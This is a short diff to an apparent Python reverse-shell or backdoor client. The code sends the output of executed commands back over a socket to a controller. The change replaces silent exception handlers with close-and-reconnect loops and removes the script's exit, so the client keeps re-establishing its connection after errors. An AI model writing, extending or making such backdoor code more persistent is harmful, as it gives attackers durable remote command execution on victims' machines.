@@ -44,13 +44,17 @@ def connect():
                 output_bytes = process.stdout.readlines() + process.stderr.readlines()
                 outputbytes = bytearray(str(output_bytes), "utf-8")
                 send_msg(s,outputbytes)
+                print("sent output")
         except socket.error:
             s.close()
             print("Error Trying Again....")
             connect()
-        except TypeError:
-            pass
         except AttributeError:
-            pass
+            s.close()
+            print("Error Trying Again....")
+            connect()
+        except TypeError:
+            s.close()
+            print("Error Trying Again....")
+            connect()
 connect()
-exit(1)
